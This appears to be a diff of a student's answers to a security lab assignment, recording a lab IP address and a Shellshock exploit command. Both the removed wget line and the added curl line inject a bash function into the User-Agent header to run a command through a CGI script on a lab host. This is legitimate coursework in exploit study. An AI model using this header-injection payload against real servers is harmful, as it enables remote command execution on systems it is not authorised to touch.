@@ -32,7 +32,7 @@ Task 1
 Example:
   IP : 172.17.0.1
 -->
-  IP : 172.22.0.10, 172.22.0.1
+  IP : 172.22.0.10
 <--
 
 
@@ -64,7 +64,7 @@ Example:
   Command : curl http://10.0.2.1:6262/cgi-bin/shellshock.cgi
 
 -->
-  Command : wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /usr/bin/task2 mhuang366" http://172.22.0.10:8088/cgi-bin/shellshock.cgi
+  Command : curl -X GET http://172.22.0.10:8088/cgi-bin/shellshock.cgi -H "User-Agent: () { test;};echo; /usr/bin/task2 mhuang366"
 <--
 
 
